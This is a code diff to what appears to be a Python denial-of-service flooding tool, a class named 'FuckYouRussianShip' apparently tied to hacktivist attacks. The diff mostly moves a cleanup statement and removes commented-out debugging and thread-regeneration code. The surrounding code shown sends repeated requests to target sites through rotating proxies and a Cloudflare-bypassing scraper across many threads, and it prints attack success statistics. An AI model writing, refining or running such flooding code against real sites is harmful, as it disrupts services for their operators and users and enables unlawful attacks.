@@ -183,6 +183,7 @@ class FuckYouRussianShip:
                 self.write_statistic_success(site, attack.status_code)
 
                 if attack.status_code >= 302:
+                    del attack
                     for proxy in data['proxy']:
                         if self.proxy_view:
                             print('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
@@ -201,7 +202,6 @@ class FuckYouRussianShip:
                         response = scraper.get(site, timeout=10)
                         self.write_statistic_success(site, response.status_code)
                         del response
-                #del attack
             except ConnectionError as exc:
                 self.write_statistic_error(site)
                 continue
@@ -209,7 +209,6 @@ class FuckYouRussianShip:
                 self.write_statistic_error(site)
                 continue
             finally:
-                del attack
                 threads_count -= 1
                 return self.mainth()
 
@@ -235,7 +234,6 @@ class FuckYouRussianShip:
     @staticmethod
     def print_statistic():
         FuckYouRussianShip.clear()
-        #tracker = SummaryTracker()
         while True:
             if len(statistic.keys()):
                 print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
@@ -259,20 +257,11 @@ class FuckYouRussianShip:
                 tp.table(data=statistic_data,
                          headers=headers,
                          width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])            
-            #tracker.print_diff()
             sleep(5)
             FuckYouRussianShip.clear()
 
     def parts_recursive(self, n, parts=[]):
         return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])
-
-
-# def regenerate_threading():
-#     while True:
-#         if threads_count < thread_count // 2:
-#             attacker_threading(thread_count // 2, attack_func)
-#         else:
-#             sleep(2)
 
 
 def attacker_threading(threads_count, worker_func):
@@ -308,7 +297,6 @@ if __name__ == '__main__':
         if not attacker.no_clear:
             attacker.clear()
         attacker.checkReq()
-        # attacker.checkUpdate()
 
         thread_count = attacker.threads
         attack_func = attacker.mainth
